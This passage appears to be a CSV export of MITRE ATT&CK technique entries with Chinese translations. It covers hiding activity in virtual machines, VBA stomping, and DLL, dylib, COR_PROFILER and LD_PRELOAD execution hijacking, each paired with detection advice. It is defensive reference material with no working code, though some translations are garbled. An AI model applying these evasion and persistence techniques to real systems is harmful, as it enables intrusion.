Benign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Image: Image Metadata, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification",True,T1564,,"Janantha Marasinghe; Johann Rehberger; Menachem Shafran, XM Cyber",User,,,,,,"(Citation: ESET LoudMiner June 2019),(Citation: Sophos Maze VM September 2020),(Citation: Sophos Ragnar May 2020),",隐藏工件/隐藏攻击行为：运行虚拟实例,攻击者可能会使用虚拟实例执行恶意操作以避免检测。存在多种允许模拟计算机或计算环境的虚拟化技术。通过在虚拟实例内运行恶意代码，攻击者可以隐藏与他们的行为相关的工件，使安全工具无法监控虚拟实例内的活动。此外，根据虚拟网络实现（例如：桥接适配器），由虚拟实例生成的网络流量可能难以追溯到受感染的主机，因为 IP 地址和主机名可能与已知值不匹配。（引文：SingHealth Breach Jan 2019) 攻击者可能会利用对虚拟化的原生支持（例如：Hyper-V）或删除必要的文件来运行虚拟实例（例如：VirtualBox 二进制文件）。运行虚拟实例后，攻击者可能会在来宾和主机之间创建一个共享文件夹，该文件夹具有使虚拟实例能够与主机文件系统交互的权限。（引用：Sophos Ragnar 2020 年 5 月）
T1564.007,Hide Artifacts: VBA Stomping,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)

MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)

An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",https://attack.mitre.org/techniques/T1564/007,17 September 2020,15 October 2021,1.1,Defense Evasion,"Detection efforts should be placed finding differences between VBA source code and p-code.(Citation: Walmart Roberts Oct 2018) VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.(Citation: pcodedmp Bontchev)(Citation: oletools toolkit)

If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the <code>PROJECT</code> stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the <code>PROJECT</code> stream will inhibit attempts of reading the VBA source code through the GUI.(Citation: FireEye VBA stomp Feb 2020)","Linux, Windows, macOS","File: File Metadata, Script: Script Execution",True,T1564,,"Rick Cole, Mandiant",User,,MS Office version specified in <code>_VBA_PROJECT</code> stream must match host,,,,",(Citation: Microsoft Disable VBA Jan 2020)",隐藏工件/隐藏攻击行为：VBA 踩踏,攻击者可以通过用良性数据替换 VBA 源代码来隐藏嵌入在 MS Office 文档中的恶意 Visual Basic for Applications (VBA) 有效负载。（引文：FireEye VBA stomp Feb 2020）在模块流中嵌入了 VBA 内容存储源代码的 MS Office 文档.每个模块流都有一个 <code>PerformanceCache</code>，用于存储称为 p-code 的 VBA 源代码的单独编译版本。当 <code>_VBA_PROJECT</code> 流中指定的 MS Office 版本（包含 VBA 项目的版本相关描述）与主机 MS Office 应用程序的版本匹配时，将执行 p-code。（引文：邪恶Clippy 2019 年 5 月）（引用：Microsoft _VBA_PROJECT Stream）攻击者可以通过用零、良性代码或随机字节覆盖 VBA 源代码位置来隐藏恶意 VBA 代码，同时留下之前编译的恶意 p 代码。扫描恶意 VBA 源代码的工具可能会被绕过，因为不需要的代码隐藏在编译的 p 代码中。如果删除 VBA 源代码，某些工具甚至可能认为不存在宏。如果 <code>_VBA_PROJECT</code> 流与宿主 MS Office 应用程序之间存在版本匹配，则将执行 p-code，否则将将良性 VBA 源代码解压缩并重新编译为 p-code，从而消除恶意p 代码和可能绕过动态分析。（引文：Walmart Roberts 2018 年 10 月）（引文：FireEye VBA stomp 2020 年 2 月）（引文：pcodedmp Bontchev）
T1574,Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",https://attack.mitre.org/techniques/T1574,12 March 2020,05 May 2022,1.2,"Defense Evasion, Persistence, Privilege Escalation","Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.

Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Monitor for changes to environment variables, as well as the commands to implement these changes.

Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.

Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata, Windows Registry: Windows Registry Key Modification",False,,"Anti-virus, Application Control",,,,,,,,"(Citation: FOX-IT May 2016 Mofang),(Citation: Cybereason Cobalt Kitty 2017),(Citation: CyberBit Dtrack),(Citation: Vulnerability and Exploit Detector),(Citation: Microsoft More information about DLL),(Citation: FireEye DLL Side-Loading),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Powersploit),(Citation: Microsoft Dynamic Link Library Search Order),(Citation: Executable Installers are Vulnerable),(Citation: Microsoft CreateProcess)",劫持执行流程,攻击者可能通过劫持操作系统运行程序的方式来执行他们自己的恶意负载。劫持执行流可能是为了持久性，因为这种劫持执行可能会随着时间的推移再次发生。攻击者也可能使用这些机制来提升特权或逃避防御，例如应用程序控制或其他执行限制。攻击者可以通过多种方式劫持执行流程，包括通过操纵操作系统定位要执行的程序的方式。操作系统如何定位程序使用的库也可以被截获。操作系统查找程序/资源的位置，例如文件目录，在 Windows 的情况下，注册表也可能被污染以包含恶意负载。
T1574.012,Hijack Execution Flow: COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",https://attack.mitre.org/techniques/T1574/012,24 June 2020,30 August 2021,1.0,"Defense Evasion, Persistence, Privilege Escalation","For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1574,,"Jesse Brown, Red Canary","Administrator, User",,,,,,"(Citation: RedCanary Mockingbird May 2020),(Citation: Windows Commands JPCERT),(Citation: NSA MS AppLocker),(Citation: Beechey 2010)",劫持执行流程：COR_PROFILER,攻击者可能会利用 COR_PROFILER 环境变量来劫持加载 .NET CLR 的程序的执行流程。 COR_PROFILER 是一个 .NET Framework 功能，它允许开发人员指定一个非托管（或 .NET 外部）分析 DLL 以加载到每个加载公共语言运行时 (CLR) 的 .NET 进程中。这些分析器旨在监视、排除故障和调试由 .NET CLR 执行的托管代码。（引用：Microsoft Profiling Mar 2017）（引用：Microsoft COR_PROFILER Feb 2013） COR_PROFILER 环境变量可以在各种范围（系统、用户，或过程）导致不同程度的影响。系统和用户范围的环境变量范围在注册表中指定，其中可以将 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 对象注册为分析器 DLL。进程范围 COR_PROFILER 也可以在不修改注册表的情况下在内存中创建。从 .NET Framework 4 开始，只要在 COR_PROFILER_PATH 环境变量中指定 DLL 的位置，就无需注册分析 DLL。（引用：Microsoft COR_PROFILER Feb 2013）攻击者可能滥用 COR_PROFILER 来建立执行每次调用 CLR 时，所有 .NET 进程上下文中的恶意 DLL。如果受害者 .NET 进程以更高的权限级别执行，则 COR_PROFILER 还可用于提升权限（例如：[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)），如以及由 .NET 进程提供的挂钩和 [削弱防御](https://attack.mitre.org/techniques/T1562)。（引文：RedCanary Mockingbird 2020 年 5 月）（引文：Red Canary COR_PROFILER 2020 年 5 月）（引文： Almond COR_PROFILER 2019 年 4 月）（引用：GitHub OmerYa Invisi-Shell）（引用：subTee .NET Profilers 2017 年 5 月）
T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)

Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",https://attack.mitre.org/techniques/T1574/001,13 March 2020,26 April 2021,1.1,"Defense Evasion, Persistence, Privilege Escalation","Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.",Windows,"File: File Creation, File: File Modification, Module: Module Load",True,T1574,,"Stefan Kanthak; Travis Smith, Tripwire",,,,CAPEC-471,,,"(Citation: NCC Group WastedLocker June 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Github PowerShell Empire),(Citation: FireEye Hikit Rootkit),(Citation: Nccgroup Emissary Panda May 2018),(Citation: MSTIC FoggyWeb September 2021),(Citation: ESET Sednit Part 3),(Citation: ESET Crutch December 2020),(Citation: Symantec Whitefly March 2019),(Citation: FinFisher Citation),(Citation: ESET InvisiMole June 2018),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: GitHub PowerSploit May 2012),(Citation: ESET Operation Groundbait),(Citation: PWC Cloud Hopper April 2017),(Citation: Securelist BlackOasis Oct 2017),(Citation: FireEye FIN7 Oct 2019),(Citation: Cybereason Chaes Nov 2020),(Citation: ZScaler Hacking Team),(Citation: FireEye APT10 April 2017),(Citation: Mandiant APT1 Appendix),(Citation: ESET EvilNum July 2020),(Citation: ESET Exchange Mar 2021),(Citation: PowerSploit Documentation),(Citation: Group IB RTM August 2019),(Citation: APT15 Intezer June 2018),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Eset Ramsay May 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Microsoft Sxstrace),(Citation: Powersploit),(Citation: Microsoft More information about DLL),(Citation: Microsoft Dynamic Link Library Search Order)",劫持执行流程：DLL 搜索顺序劫持,攻击者可以通过劫持用于加载 DLL 的搜索顺序来执行自己的恶意负载。 Windows 系统使用一种常用方法来查找所需的 DLL 以加载到程序中。 （引用：Microsoft Dynamic Link Library Search Order）（引用：FireEye Hijacking 2010 年 7 月）劫持 DLL 加载可能是为了建立持久性以及提升权限和/或规避文件执行的限制。攻击者可以通过多种方式劫持 DLL 加载。攻击者可能会在一个目录中植入木马动态链接库文件 (DLL)，该目录将在程序请求的合法库的位置之前进行搜索，导致 Windows 在受害者程序调用其恶意库时加载其恶意库.攻击者还可以通过将与模糊指定的 DLL 同名的恶意 DLL 放置在 Windows 在合法 DLL 之前搜索的位置来执行 DLL 预加载，也称为二进制植入攻击（引用：OWASP Binary Planting）。此位置通常是程序的当前工作目录。（引用：FireEye fxsst 2011 年 6 月）远程 DLL 预加载攻击发生在程序在加载 DLL 之前将其当前目录设置为远程位置（例如 Web 共享）时。 （引用：Microsoft 安全公告 2269637）攻击者还可以通过 DLL 重定向直接修改搜索顺序，启用后（在注册表中并创建重定向文件）可能会导致程序加载不同的 DLL。（引用：Microsoft Dynamic -Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking) 如果一个搜索顺序漏洞的程序被配置为以更高的权限级别运行，那么加载的攻击者控制的 DLL 也将被执行在更高的水平。在这种情况下，该技术可用于从用户到管理员或 SYSTEM 或从管理员到 SYSTEM 的权限升级，具体取决于程序。成为路径劫持受害者的程序可能表现正常，因为恶意 DLL 可能被配置为也加载它们打算替换的合法 DLL。
T1574.002,Hijack Execution Flow: DLL Side-Loading,"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).

Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",https://attack.mitre.org/techniques/T1574/002,13 March 2020,05 May 2022,2.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",Windows,"File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation",True,T1574,"Anti-virus, Application Control",,,,,CAPEC-641,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: Arbor Musical Chairs Feb 2018),(Citation: Symantec Cicada November 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: PTSecurity Higaisa 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ATT Sidewinder January 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: Trend Micro Tick November 2019),(Citation: Profero APT27 December 2020),(Citation: FinFisher Citation),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Microsoft FinFisher March 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Palo Alto Networks BBSRAT),(Citation: FireEye APT41 Aug 2019),(Citation: Proofpoint TA416 November 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: Stewart 2014),(Citation: Unit42 Emissary Panda May 2019),(Citation: Dell TG-3390),(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: FireEye Clandestine Fox),(Citation: Palo Alto PlugX June 2017),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Recorded Future REDDELTA July 2020),(Citation: Dell Sakula),(Citation: FireEye Metamorfo Apr 2018),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: FireEye Clandestine Fox Part 2),(Citation: Bitdefender Naikon April 2021),(Citation: Microsoft Wingbird Nov 2017),(Citation: Securelist APT10 March 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Microsoft SIR Vol 21),(Citation: NCC Group Chimera January 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Proofpoint TA459 April 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Anomali Pirate Panda April 2020),(Citation: Forcepoint Monsoon),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cyble Egregor Oct 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: FireEye DLL Side-Loading)",劫持执行流程：DLL 侧加载,攻击者可以通过侧载 DLL 来执行他们自己的恶意负载。与 [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001) 类似，side-loading 涉及劫持程序加载的 DLL。但是，不仅仅是在程序的搜索顺序中植入 DLL，然后等待受害者应用程序被调用，攻击者还可以通过植入然后调用执行其有效负载的合法应用程序来直接侧载其有效负载。旁加载利用加载程序使用的 DLL 搜索顺序，将受害应用程序和恶意负载放在一起。攻击者可能会使用侧载作为掩盖他们在合法、受信任和可能提升的系统或软件进程下执行的操作的一种手段。用于侧载负载的良性可执行文件在交付和/或执行期间可能不会被标记。攻击者有效载荷也可能被加密/打包或以其他方式混淆，直到加载到受信任进程的内存中。（引用：FireEye DLL Side-Loading）
T1574.004,Hijack Execution Flow: Dylib Hijacking,"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",https://attack.mitre.org/techniques/T1574/004,16 March 2020,05 May 2022,2.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. 

Run path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>.(Citation: Apple Developer Doco Archive Run-Path) These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Github EmpireProject HijackScanner)",macOS,"File: File Creation, File: File Modification, Module: Module Load",True,T1574,Application Control,,,,,CAPEC-471,,,"(Citation: Github PowerShell Empire),",劫持执行流程：Dylib 劫持,攻击者可以通过将具有预期名称的恶意动态库 (dylib) 放置在受害者应用程序在运行时搜索的路径中来执行自己的有效负载。动态加载器将尝试根据搜索路径的顺序查找 dylib。 dylibs 的路径可以以 <code>@rpath</code> 为前缀，这允许开发人员使用相对路径来指定在运行时根据可执行文件的位置使用的搜索路径数组。此外，如果使用弱链接，例如 <code>LC_LOAD_WEAK_DYLIB</code> 函数，即使预期的 dylib 不存在，应用程序仍将执行。弱链接使开发人员能够在添加新 API 时在多个 macOS 版本上运行应用程序。攻击者可以通过在识别的路径中插入带有缺失 dylib 名称的恶意 dylib 来获得执行。（引用：Wardle Dylib Hijack Vulnerable Apps）（引用：Wardle Dylib Hijacking OSX 2015）（引用：Github EmpireProject HijackScanner）（引用：Github EmpireProject CreateHijacker Dylib) Dylib 被加载到应用程序的地址空间中，允许恶意 dylib 继承应用程序的特权级别和资源。根据应用程序，这可能会导致权限升级和不受限制的网络访问。这种方法也可能逃避安全产品的检测，因为执行是在合法进程下被掩盖的。（引文：为 OSX 编写不良恶意软件）（引文：wardle artofmalware volume1）（引文：MalwareUnicorn macOS Dylib Injection MachO）
T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)

On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.

On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) 

On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ",https://attack.mitre.org/techniques/T1574/006,13 March 2020,27 April 2021,2.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.

Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation",True,T1574,,,User,,,"CAPEC-13, CAPEC-640",,,"(Citation: Anomali Rocke March 2019),(Citation: Intezer HiddenWasp Map 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ESET Ebury Oct 2017),(Citation: Unit 42 Hildegard Malware),(Citation: Apple Developer Doco Hardened Runtime)",劫持执行流程：动态链接器劫持,攻击者可以通过劫持动态链接器用来加载共享库的环境变量来执行他们自己的恶意负载。在程序的执行准备阶段，动态链接器从环境变量和文件中加载指定的共享库的绝对路径，例如 Linux 上的 <code>LD_PRELOAD</code> 或 macOS 上的 <code>DYLD_INSERT_LIBRARIES</code>。首先加载环境变量中指定的库，优先于具有相同函数名称的系统库。（引用：Man LD.SO）（引用：TLDP Shared Libraries）（引用：Apple Doco Archive Dynamic Libraries）这些变量通常由开发人员无需重新编译即可调试二进制文件，消除映射符号冲突，并在不更改原始库的情况下实现自定义函数。（引用：Baeldung LD_PRELOAD）在 Linux 和 macOS 上，劫持动态链接器变量可能会授予对受害者进程的内存、系统/网络的访问权限资源，以及可能提升的特权。此方法还可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。攻击者可以通过命令行使用 <code>export</code> 命令、<code>setenv</code> 函数或 <code>putenv</code> 函数设置环境变量。攻击者还可以利用 [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) 在 shell 中导出变量或使用 Python 的 <code>os.environ</ 等高级语法以编程方式设置变量代码>。在 Linux 上，攻击者可以将 <code>LD_PRELOAD</code> 设置为指向与受害程序请求的合法库名称相匹配的恶意库，从而导致操作系统在执行受害程序时加载攻击者的恶意代码. <code>LD_PRELOAD</code> 可以通过环境变量或 <code>/etc/ld.so.preload</code> 文件设置。(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) 指定的库<code>LD_PRELOAD</code> 分别由 <code>dlopen()</code> 和 <code>mmap()</code> 加载并映射到内存中。（引用：Linux 和 macOS 上的代码注入）（引文：Uninformed Needle）（引文：Phrack halfdead 1997）（引文：Brown Exploiting Linkers）在 macOS 上，此行为在概念上与 Linux 上相同，不同之处仅在于 macOS 动态库 (dyld) 在较低级别上的实现方式。攻击者可以将 <code>DYLD_INSERT_LIBRARIES</code> 环境变量设置为指向包含受害程序请求的合法库或函数名称的恶意库。（引用：TheEvilBit DYLD_INSERT_LIBRARIES）（引用：Timac DYLD_INSERT_LIBRARIES）（引用：Gabilondo DYLD_INSERT_LIBRARIES Catalina旁路）
